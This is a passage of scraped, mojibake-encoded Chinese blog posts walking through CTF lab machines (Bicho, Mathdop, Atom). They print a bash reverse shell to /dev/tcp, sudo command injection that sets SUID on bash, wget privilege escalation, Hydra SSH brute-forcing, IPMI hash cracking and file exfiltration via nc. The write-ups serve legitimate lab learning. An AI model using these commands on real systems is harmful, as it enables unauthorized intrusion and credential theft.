mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser app may run the following commands on 3b66fe911993:\r(wpuser) NOPASSWD: /usr/local/bin/wp è¿™ä¸ªå·¥å…·æ˜¯wp-cliï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯\napp@3b66fe911993:~$ sudo -u wpuser /usr/local/bin/wp --info\rsudo -u wpuser /usr/local/bin/wp --info\rOS: Linux 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64\rShell: /bin/bash\rPHP binary: /usr/bin/php8.3\rPHP version: 8.3.6\rphp.ini used: /etc/php/8.3/cli/php.ini\rMySQL binary: /usr/bin/mysql\rMySQL version: mysql Ver 8.0.41-0ubuntu0.24.04.1 for Linux on x86_64 ((Ubuntu))\rSQL modes:\rWP-CLI root dir: phar://wp-cli.phar/vendor/wp-cli/wp-cli\rWP-CLI vendor dir: phar://wp-cli.phar/vendor\rWP_CLI phar path: /home/app\rWP-CLI packages dir:\rWP-CLI cache dir: /home/wpuser/.wp-cli/cache\rWP-CLI global config:\rWP-CLI project config:\rWP-CLI version: 2.11.0 æŸ¥çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªexecå‚æ•°å¯ä»¥è¿›è¡Œphpä»£ç æ‰§è¡Œ\nwp cli cmd-dump â€“ WP-CLI Command | Developer.WordPress.org app@3b66fe911993:~$ sudo -u wpuser /usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;id\u0026#34;);\u0026#39; sudo -u wpuser /usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;id\u0026#34;);\u0026#39; uid=1002(wpuser) gid=1002(wpuser) groups=1002(wpuser),100(users)\rsh: 1: less: not found\rapp@3b66fe911993:~$ è¿™é‡Œæˆ‘æ˜¯å…ˆå†™å…¥çš„æ¶æ„ä»£ç æ–‡ä»¶ï¼Œç„¶åå†å»æ‰§è¡Œä»–\napp@3b66fe911993:/tmp$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;shell\recho \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;shell\rapp@3b66fe911993:/tmp$ cat shell\rcat shell\rbash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.1/6789 0\u0026gt;\u0026amp;1\rapp@3b66fe911993:~$ chmod +x /tmp/shell\rchmod +x /tmp/shell\rapp@3b66fe911993:~$ sudo -u wpuser /usr/local/bin/wp --exec=\u0026#39;system(\u0026#34;bash /tmp/shell\u0026#34;);\u0026#39; Root #\ræŸ¥çœ‹ä¸€ä¸‹sudo\nwpuser@3b66fe911993:~$ sudo -l\rsudo -l\rMatching Defaults entries for wpuser on 3b66fe911993:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser wpuser may run the following commands on 3b66fe911993:\r(root) NOPASSWD: /opt/scripts/backup.sh æŸ¥çœ‹ä¸€ä¸‹å…·ä½“å†…å®¹\n#!/bin/bash\r# Author: Ãlvaro Bernal (aka. trr0r)\r# backup.sh: Realiza una copia de un log en una ubicaciÃ³n determinada (/backup)\r# COLORES\rgreenColour=\u0026#34;\\e[0;32m\\033[1m\u0026#34;\rendColour=\u0026#34;\\033[0m\\e[0m\u0026#34;\rredColour=\u0026#34;\\e[0;31m\\033[1m\u0026#34;\rblueColour=\u0026#34;\\e[0;34m\\033[1m\u0026#34;\ryellowColour=\u0026#34;\\e[0;33m\\033[1m\u0026#34;\rpurpleColour=\u0026#34;\\e[0;35m\\033[1m\u0026#34;\rturquoiseColour=\u0026#34;\\e[0;36m\\033[1m\u0026#34;\rgrayColour=\u0026#34;\\e[0;37m\\033[1m\u0026#34;\rorangeColour=\u0026#34;\\e[38;5;214m\\033[1m\u0026#34;\rdarkRedColour=\u0026#34;\\e[38;5;124m\\033[1m\u0026#34;\rif [ $# -eq 0 ]; then\recho -e \u0026#34;\\n${redColour}[!] Error, debes de proporcionar un argumento.${endColour}\\n\\n\\t${blueColour}Example:${endColour} ${greenColour}/opt/scripts/backup.sh access${endColour}\\n\u0026#34;\rexit\rfi\r# Variables GLOBALES\rLOG_DIR=\u0026#34;/var/log/apache2\u0026#34;\rBACKUP_DIR=\u0026#34;/backup\u0026#34;\rLOG_NAME=$1\rFULL_NAME=\u0026#34;$LOG_DIR/$LOG_NAME.log\u0026#34;\r/usr/bin/echo \u0026#34;Realizando copia de $FULL_NAME en $BACKUP_DIR\u0026#34;\rCOMMAND=\u0026#34;/usr/bin/cp $FULL_NAME $BACKUP_DIR\u0026#34;\reval $COMMAND å¯ä»¥å‘ç°ä¼ å…¥å‚æ•°å¹¶æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤å°±ç›´æ¥æ‹¼æ¥çš„ï¼Œå› æ­¤å¯ä»¥å°è¯•è¿›è¡Œå‘½ä»¤æ³¨å…¥\nwpuser@3b66fe911993:/tmp$ sudo -u root /opt/scripts/backup.sh \u0026#34;../../../tmp/a; touch /tmp/ppp;\u0026#34; wpuser@3b66fe911993:/tmp$ sudo -u root /opt/scripts/backup.sh \u0026#34;../../../tmp/a; chmod u+s /bin/bash;\u0026#34; Summary #\rUserï¼šé€šè¿‡ç™»å½•å¤±è´¥æ’å…¥PHPä»£ç åˆ°User-Agentï¼Œåœ¨debuglogé‡Œå¯ä»¥è§¦å‘ï¼Œåå¼¹shellæ‹¿åˆ°www-dataã€‚å†…ç½‘ç«¯å£5000ä¸Šçš„flaskæœåŠ¡é€šè¿‡è®¾ç½®HOSTæ¥è¿›å…¥åˆ°**/console**ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤æ‹¿åˆ°appã€‚å†é€šè¿‡wp-cliçš„phpå‘½ä»¤æ‰§è¡Œæ‹¿åˆ°wpuserã€‚\nRootï¼šè„šæœ¬ä¸­çš„å‚æ•°å¯ä»¥ä½¿ç”¨åˆ†å·è¿›è¡Œæ‹¼æ¥ç»•è¿‡ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚\n","date":"2025-04-25","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-bicho/","section":"Posts","summary":"","title":"Dockerlabs-Bicho","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficult Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.55.13 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r| ssh-hostkey: | 2048 ac:78:16:74:49:a1:68:9d:54:84:8a:59:e9:38:10:bc (RSA)\r| 256 06:0c:4d:9d:2c:32:43:d2:3d:f7:4f:82:c8:15:85:60 (ECDSA)\r|_ 256 3b:cd:fc:1f:dd:48:0f:ee:17:78:9a:f1:09:cb:8c:ec (ED25519)\r7577/tcp open http Apache Tomcat (language: en)\r| http-title: Site doesn\u0026#39;t have a title (application/hal+json).\r|_Requested resource was http://192.168.55.13:7577/api\r| http-methods: |_ Potentially risky methods: PUT PATCH DELETE\r9393/tcp open http Apache Tomcat (language: en)\r| http-methods: |_ Potentially risky methods: PUT PATCH DELETE\r|_http-title: Site doesn\u0026#39;t have a title (application/hal+json). CVE-2024-37084 #\rè¿›å…¥åˆ°9393ç«¯å£çš„dashboard\nç»è¿‡æœç´¢å¾—çŸ¥ï¼šLy4j/CVE-2024-37084-Exp: Spring Cloud Data Flow CVE-2024-37084 exp\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„kaliçš„javaç‰ˆæœ¬å¯èƒ½ä¸å¯¹ï¼Œç”Ÿæˆçš„jaråŒ…æ— æ³•å®Œæˆåå¼¹shell\näºæ˜¯jaråŒ…çš„åˆ¶ä½œæˆ‘æ˜¯åœ¨windowsä¸Šè¿›è¡Œçš„\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰§è¡Œä¸€æ¬¡pocï¼Œå°±è¦ç»™ä¿®æ”¹ä¸€æ¬¡jaråŒ…çš„åç§°\nDocker break #\rå½“å‰ç¯å¢ƒæ˜¯åœ¨dockeré‡Œçš„ï¼ŒæŸ¥æ‰¾æœ‰SUIDçš„æ–‡ä»¶\ncnb@921567b128b2:/workspace$ find / -user root -perm -4000 -print 2\u0026gt;/dev/null\rfind / -user root -perm -4000 -print 2\u0026gt;/dev/null\r/bin/mount\r/bin/su\r/bin/umount\r/usr/bin/chfn\r/usr/bin/chsh\r/usr/bin/gpasswd\r/usr/bin/newgrp\r/usr/bin/passwd\r/usr/local/bin/wget å¯ä»¥åˆ©ç”¨wgetè¿›è¡Œææƒï¼šwget | GTFOBins\ncnb@921567b128b2:/workspace$ TF=$(mktemp)\rTF=$(mktemp)\rcnb@921567b128b2:/workspace$ chmod +x $TF\rchmod +x $TF\rcnb@921567b128b2:/workspace$ echo -e \u0026#39;#!/bin/sh -p\\n/bin/sh -p 1\u0026gt;\u0026amp;0\u0026#39; \u0026gt;$TF\recho -e \u0026#39;#!/bin/sh -p\\n/bin/sh -p 1\u0026gt;\u0026amp;0\u0026#39; \u0026gt;$TF\rcnb@921567b128b2:/workspace$ /usr/local/bin/wget --use-askpass=$TF 0 /usr/local/bin/wget --use-askpass=$TF 0\rwhoami\rroot\rid\ruid=1000(cnb) gid=1000(cnb) euid=0(root) egid=0(root) groups=0(root),1000(cnb) å…ˆæŸ¥çœ‹ä¸€ä¸‹ç•™è¨€\ncat /home/cnb/note\rHi mathlake\rLong time no see, 256 is my favorite number. I know you are very interested in mathematics, but I have been struggling with a math problem recently. The method used is time series decomposition. I have sent you the data, and you can provide me with the mathematical expressions for T, S, and C (rounded to the nearest integer) corresponding to the month.\rJune 2025\rå¥½ä¹…ä¸è§äº†ï¼Œ256æ˜¯æˆ‘æœ€å–œæ¬¢çš„å·ç ã€‚æˆ‘çŸ¥é“ä½ å¯¹æ•°å­¦å¾ˆæ„Ÿå…´è¶£ï¼Œä½†æœ€è¿‘æˆ‘ä¸€ç›´åœ¨åŠªåŠ›è§£å†³ä¸€ä¸ªæ•°å­¦é—®é¢˜ã€‚ä½¿ç”¨çš„æ–¹æ³•æ˜¯æ—¶é—´åºåˆ—åˆ†è§£ã€‚æˆ‘å·²ç»å‘æ‚¨å‘é€äº†æ•°æ®ï¼Œæ‚¨å¯ä»¥ä¸ºæˆ‘æä¾›ä¸æœˆä»½ç›¸å¯¹åº”çš„Tã€Så’ŒCï¼ˆèˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°ï¼‰çš„æ•°å­¦è¡¨è¾¾å¼ã€‚\r2025å¹´6æœˆ è¿›å…¥åˆ°é‚®ç®±é‡Œæ‹¿åˆ°ä¸‰ä¸ªæ–‡ä»¶\ncd /var/mail/mathlake\rls -al\rtotal 28\rdrwx--S---. 2 root mail 55 Mar 12 01:47 .\rdrwxrwsr-x. 1 root mail 22 Mar 12 01:41 ..\r-rw-r--r--. 1 root mail 10299 Mar 7 08:14 data.xlsx\r-rw-r--r--. 1 root mail 3906 Mar 11 23:56 test.png\r-rw-r--r--. 1 root mail 8815 Mar 11 23:58 true.png å¯ä»¥è½¬base64ç„¶ååˆ°æœ¬åœ°åˆè½¬å›å»ï¼Œè¿™æ ·çš„æ–¹å¼æ¥ä¼ é€’\ncat data.xlsx | base64 å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ•°å­—çš„å¤§å°èŒƒå›´\nå› æ­¤å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥è¿›è¡Œçˆ†ç ´\n#!/bin/bash\routput_file=\u0026#34;sha256_results.txt\u0026#34;\rfor i in {40..60}; do\rfor j in {0..2}; do\rfor k in {0..2}; do\recho \u0026#34;${i}*${j}*${k}\u0026#34; | sha256sum \u0026gt;\u0026gt; \u0026#34;$output_file\u0026#34;\rdone\rdone\rdone ç„¶åç”¨awkå–å‡ºç¬¬ä¸€åˆ—\n[root@kali] /home/kali/mathdop â¯ awk \u0026#39;{print $1}\u0026#39; sha256_results.txt \u0026gt; passwords ç”±äº**/var/mailä¸­çš„ç”¨æˆ·åæ˜¯mathlake**ï¼Œå¯ä»¥å°è¯•ç”¨è¿™ä¸ªæ¥è¿›è¡Œçˆ†ç ´\n[root@kali] /home/kali/mathdop â¯ hydra -l mathlake -P passwords ssh://192.168.55.13 -I Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-23 09:52:52\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 189 login tries (l:1/p:189), ~12 tries per task\r[DATA] attacking ssh://192.168.55.13:22/\r[22][ssh] host: 192.168.55.13 login: mathlake password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3\r1 of 1 target successfully completed, 1 valid password found\r[WARNING] Writing restore file because 4 final worker threads did not complete until end.\r[ERROR] 4 targets did not resolve or could not be connected\r[ERROR] 0 target did not complete Root #\r[mathlake@mathdop ~]$ sudo -l\rMatching Defaults entries for mathlake on mathdop:\r!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR\rLS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT\rLC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET\rXAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\rUser mathlake may run the following commands on mathdop:\r(ALL) NOPASSWD: /opt/secure_input_handler.sh\r[mathlake@mathdop ~]$ cat /opt/secure_input_handler.sh #!/bin/bash\rexport PATH=\u0026#34;/usr/bin\u0026#34;\rread -p \u0026#34;Input Command: \u0026#34; user_input\rdecoded_input=$(echo -n \u0026#34;$user_input\u0026#34; | base64 -d 2\u0026gt;/dev/null | tr -d \u0026#39;\\r\\0\\a\u0026#39; | col -b)\rif [[ ${#user_input} -gt 128 || -z \u0026#34;$decoded_input\u0026#34; ]]; then\recho \u0026#34;[!] Decoding failed or input is too long\u0026#34; \u0026gt;\u0026amp;2\rexit 2\rfi\rfiltered_input=$(echo \u0026#34;$decoded_input\u0026#34; | tr -cd \u0026#39;a-zA-Z0-9\\-_/ :.\u0026#39; | sed -e \u0026#39;s/[[:space:]]\\+/ /g\u0026#39; -e \u0026#39;s/^[ \\t]*//\u0026#39; -e \u0026#39;s/[ \\t]*$//\u0026#39;)\rIFS=\u0026#39; \u0026#39; read -ra cmd_args \u0026lt;\u0026lt;\u0026lt; \u0026#34;$filtered_input\u0026#34;\rcommand=\u0026#34;${cmd_args[0]}\u0026#34;\rcommand_clean=$(echo \u0026#34;$command\u0026#34; | tr -d -c \u0026#39;a-zA-Z0-9\u0026#39;)\rallowed_commands=(\u0026#34;date\u0026#34; \u0026#34;pwd\u0026#34; \u0026#34;echo\u0026#34;)\rif ! printf \u0026#34;%s\\n\u0026#34; \u0026#34;${allowed_commands[@]}\u0026#34; | grep -qxF \u0026#34;$command_clean\u0026#34;; then\recho \u0026#34;[!] Illegal instruction: $command_clean\u0026#34; \u0026gt;\u0026amp;2\rexit 3\rfi\r/usr/bin/timeout 2 /usr/bin/bash -c \u0026#34;${filtered_input}\u0026#34; è¿™é‡Œå¹¶ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹ä¸€ä¸‹**/etc/shadow**\ndate -f /etc/shadow\rZGF0ZSAtZiAvZXRjL3NoYWRvdw== è¿™ä¸ªå°±æ˜¯rootçš„å¯†ç \næœ‰ç‚¹è„‘æ´å“ˆ~\nSummary #\rUserï¼šSpringæ¡†æ¶æ¼æ´ï¼Œdockeré€ƒé€¸ï¼Œæ‹¿åˆ°é‚®ç®±é‡Œçš„ä¸œè¥¿ï¼Œå¯ä»¥å°è¯•çˆ†ç ´å¯†ç ï¼Œç™»å½•åˆ°mathdop\nRootï¼šè¯»å–**/etc/shadow**é‡Œé¢çš„å¯†ç \n","date":"2025-04-24","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-mathdop/","section":"Posts","summary":"","title":"HackMyVM-Mathdop","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/atom â¯ nmap 192.168.55.12 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)\r|_ 256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519) åªæœ‰22ç«¯å£å¼€æ”¾ï¼Ÿæœ‰è¶£\næ‰«ä¸€ä¸‹UDPç«¯å£\n[root@kali] /home/kali/atom â¯ nmap 192.168.55.12 -sU --top-ports 100 â\rPORT STATE SERVICE\r623/udp open asf-rmcp IPMI #\rIPMIï¼ˆæ™ºèƒ½å¹³å°ç®¡ç†æ¥å£ï¼‰èƒ½å¤Ÿæ¨ªè·¨ä¸åŒçš„æ“ä½œç³»ç»Ÿã€å›ºä»¶å’Œç¡¬ä»¶å¹³å°ï¼Œå¯ä»¥æ™ºèƒ½çš„ç›‘è§†ã€æ§åˆ¶å’Œè‡ªåŠ¨å›æŠ¥å¤§é‡æœåŠ¡å™¨çš„è¿ä½œçŠ¶å†µï¼Œä»¥é™ä½æœåŠ¡å™¨ç³»ç»Ÿæˆæœ¬ã€‚\nå‚è€ƒï¼š623/UDP/TCP - IPMI - HackTricks\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):\rName Current Setting Required Description\r---- --------------- -------- -----------\rCRACK_COMMON true yes Automatically crack common passwords as they are obtained\rOUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format\rOUTPUT_JOHN_FILE output no Save captured password hashes in john the ripper format\rPASS_FILE /usr/share/metasploit-framework/data/ yes File containing common passwords for offline cracking, one per line\rwordlists/ipmi_passwords.txt\rRHOSTS 192.168.55.12 yes The target host(s), see https://docs.metasploit.com/docs/using-metas\rploit/basics/using-metasploit.html\rRPORT 623 yes The target port\rSESSION_MAX_ATTEMPTS 5 yes Maximum number of session retries, required on certain BMCs (HP iLO\r4, etc)\rSESSION_RETRY_DELAY 5 yes Delay between session retries in seconds\rTHREADS 1 yes The number of concurrent threads (max one per host)\rUSER_FILE /usr/share/seclists/Usernames/Names/n yes File containing usernames, one per line\rames.txt\rView the full module info with the info, or info -d command. ç„¶åè¿›è¡Œå¯†ç çˆ†ç ´\n[root@kali] /home/kali/atom â¯ john output --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 36 password hashes with 36 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 AVX 4x])\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rphones (192.168.55.12 palmer) castillo1 (192.168.55.12 stacey) 2468 (192.168.55.12 carsten) milo123 (192.168.55.12 deshawn) jiggaman (192.168.55.12 onida) sexymoma (192.168.55.12 terra) me4life (192.168.55.12 sibylle) chatroom (192.168.55.12 fabien) 122987 (192.168.55.12 cati) mackenzie2 (192.168.55.12 merola) TWEETY1 (192.168.55.12 asia) 10101979 (192.168.55.12 wai-ching) jesus06 (192.168.55.12 briella) jaffa1 (192.168.55.12 ranga) 071590 (192.168.55.12 harrie) number17 (192.168.55.12 jerrilee) darell (192.168.55.12 richardson) billandben (192.168.55.12 kalie) honda (192.168.55.12 analiese) kittyboo (192.168.55.12 shirin) 515253 (192.168.55.12 pauly) 290992 (192.168.55.12 bqb) poynter (192.168.55.12 zali) numberone (192.168.55.12 kaki) djones (192.168.55.12 riyaz) 090506 (192.168.55.12 saman) emeralds (192.168.55.12 karlotte) 081704 (192.168.55.12 jem) 120691 (192.168.55.12 zaylen) tripod (192.168.55.12 ende) 241107 (192.168.55.12 mayeul) trick1 (192.168.55.12 laten) evan (192.168.55.12 glynn) batman! (192.168.55.12 rozalia) dezzy (192.168.55.12 els) cukorborso (192.168.55.12 admin) æ‰”ç»™Hydraå°è¯•çˆ†ç ´ç™»å½•\n[root@kali] /home/kali/atom â¯ hydra -C cred ssh://192.168.55.12 -I â\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-21 23:13:39\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 37 login tries, ~3 tries per task\r[DATA] attacking ssh://192.168.55.12:22/\r[22][ssh] host: 192.168.55.12 login: onida password: jiggaman\r1 of 1 target successfully completed, 1 valid password found\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-21 23:13:48 Root #\ræ³¨æ„åˆ°æœºå™¨ä¸­å­˜åœ¨dockerç¯å¢ƒ\nonida@atom:/tmp$ ip a\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever\r2: enp0s3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\rlink/ether 08:00:27:5c:29:73 brd ff:ff:ff:ff:ff:ff\rinet 192.168.55.12/24 brd 192.168.55.255 scope global dynamic noprefixroute enp0s3\rvalid_lft 357sec preferred_lft 357sec\rinet6 fe80::1c10:8025:62af:f8b/64 scope link noprefixroute valid_lft forever preferred_lft forever\r3: docker0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:e1:81:99:86 brd ff:ff:ff:ff:ff:ff\rinet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\rvalid_lft forever preferred_lft forever\rinet6 fe80::42:e1ff:fe81:9986/64 scope link valid_lft forever preferred_lft forever\r5: veth3316341@if4: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master docker0 state UP group default link/ether 5e:24:c1:41:22:74 brd ff:ff:ff:ff:ff:ff link-netnsid 0\rinet6 fe80::5c24:c1ff:fe41:2274/64 scope link valid_lft forever preferred_lft forever å¹¶ä¸”æœ‰å†…ç½‘ç«¯å£å¼€æ”¾\nonida@atom:/tmp$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:623 0.0.0.0:* tcp LISTEN 0 4096 0.0.0.0:623 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:41553 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:80 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* å…ˆæŸ¥çœ‹ä¸€ä¸‹ç½‘ç«™ç›®å½•\nonida@atom:/var/www/html$ ls -al\rtotal 172\rdrwxr-xr-x 6 www-data www-data 4096 May 27 2024 .\rdrwxr-xr-x 3 root root 4096 May 25 2024 ..\r-rwxr-xr-x 1 www-data www-data 114688 May 27 2024 atom-2400-database.db\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 css\rdrwxr-xr-x 4 www-data www-data 4096 Dec 31 2400 img\r-rw-r--r-- 1 www-data www-data 11767 Dec 31 2400 index.php\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 js\r-rw-r--r-- 1 www-data www-data 6262 Dec 31 2400 login.php\r-rwxr-xr-x 1 www-data www-data 1637 Dec 31 2400 profile.php\r-rw-r--r-- 1 www-data www-data 5534 Dec 31 2400 register.php\rdrwxr-xr-x 2 www-data www-data 4096 Dec 31 2400 video å°†è¿™ä¸ªæ•°æ®åº“æ–‡ä»¶è½¬å‡ºæ¥\nonida@atom:/var/www/html$ caat atom-2400-database.db \u0026gt; /dev/tcp/192.168.55.4/8888\r[root@kali] /home/kali/atom â¯ nc -lvnp 8888 \u0026gt; atom-2400-database.db\rlistening on [any] 8888 ...\rconnect to [192.168.55.4] from (UNKNOWN) [192.168.55.12] 54048 çˆ†ç ´å¯†ç \n[root@kali] /home/kali/atom â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\rCost 1 (iteration count) is 1024 for all loaded hashes\rWill run 8 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rmadison (?) 1g 0:00:00:00 DONE (2025-04-21 23:22) 1.470g/s 317.6p/s 317.6c/s 317.6C/s alejandro..jessie\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. Summary #\rUserï¼šé€šè¿‡IPMIæœåŠ¡æ³„éœ²å‡ºç”¨æˆ·å¯†ç ï¼Œè¿›è¡Œsshç™»å½•çˆ†ç ´\nRootï¼šæ•°æ®åº“æ–‡ä»¶è§£å¯†ï¼Œå¾—åˆ°rootå¯†ç \n","date":"2025-04-22","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-atom/","section":"Posts","summary":"","title":"HackMyVM-Atom","type":"posts"},{"content":"","date":"2025-04-22","externalUrl":null,"permalink":"/tags/vulnvm/","section":"Tags","summary":"","title":"Vulnvm","type":"tags"},{"content":"","date":"2025-04-22","externalUrl":null,"permalink":"/categories/vulnvm/","section":"Categories","summary":"","title":"Vulnvm","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.55.11 -sV -A -p- Not shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 69:dc:67:49:10:2a:a4:26:a8:9f:c4:5d:a3:b8:a1:3e (ECDSA)\r|_ 256 6a:2b:e4:44:29:78:62:fb:61:0b:09:2f:9c:bc:18:c6 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Feroxbuster #\r[root@kali] /home/kali â¯ feroxbuster -u \u0026#39;http://192.168.55.11/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.11/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 0l 0w 0c 